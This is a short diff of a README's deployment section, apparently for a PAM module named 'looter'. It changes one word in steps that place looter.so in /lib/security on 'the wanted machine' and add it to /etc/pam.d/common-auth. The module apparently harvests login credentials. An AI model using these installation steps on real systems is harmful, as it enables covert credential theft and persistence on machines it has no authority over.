@@ -31,7 +31,7 @@ make
 
 ## Deployment
 
-Copy the `looter.so` to the wanted machine on `/lib/security`, then edit the `/etc/pam.d/common-auth` and add the following lines:
+Copy the `looter.so` to the wanted machine on `/lib/security`, then edit the `/etc/pam.d/common-auth` and append the following lines:
 ```
 auth optional looter.so
 account optional looter.so
